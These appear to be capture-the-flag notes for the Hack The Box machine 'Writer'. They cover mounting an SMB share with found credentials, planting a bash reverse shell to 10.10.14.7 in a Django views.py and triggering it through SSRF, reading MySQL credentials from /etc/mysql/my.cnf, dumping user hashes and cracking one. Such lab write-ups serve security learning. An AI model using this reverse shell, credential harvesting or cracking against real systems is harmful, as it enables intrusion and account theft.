# Mount SMB

```bash
mount -t cifs -o "user=kyle,password=ToughPasswordToCrack" //writer.htb/writer2_project writer2_project
```

Enumerating SMB, this is the app running internally on 8080, so we can use SSRF on main app upload url feature (hidden field on the form) to make a request to this one, by editing the views.py 

# Views.py

```python
from django.shortcuts import render
from django.views.generic import TemplateView
import os

def home_page(request):
    os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.7/9001 0>&1'")
    template_name = "index.html"
    return render(request,template_name)
```


# Writer Upload File SSRF
![[Pasted image 20210802220139.png]]

![[Pasted image 20210802220208.png]]


![[Pasted image 20210802220103.png]]

# Django Creds

writerv2/settings.py contains a reference to /etc/mysql/my.cnf, wich contains creds

```bash
cat /etc/mysql/my.cnf
[client]
database = dev
user = djangouser
password = DjangoSuperPassword
default-character-set = utf8
```


```bash
mysql -u djangouser -p

MariaDB [dev]> select username, email, password from dev.auth_user;
+----------+-----------------+------------------------------------------------------------------------------------------+
| username | email           | password                                                                                 |
+----------+-----------------+------------------------------------------------------------------------------------------+
| kyle     | kyle@writer.htb | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= |
+----------+-----------------+------------------------------------------------------------------------------------------+
```


# Crack the password

```bash
pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= 

kyle:marcoantonio
```